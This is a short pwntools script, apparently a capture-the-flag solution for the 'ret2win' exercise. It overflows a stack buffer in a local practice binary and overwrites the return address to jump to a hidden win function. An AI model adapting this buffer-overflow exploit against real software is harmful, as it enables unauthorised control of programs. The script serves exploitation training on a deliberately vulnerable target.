from pwn import *

target = process("./ret2win")
payload = b"A"*40 # Initial padding up to saved return address
payload += p64(0x400757) # Point the return address to ret2win()
target.sendline(payload)
target.interactive()
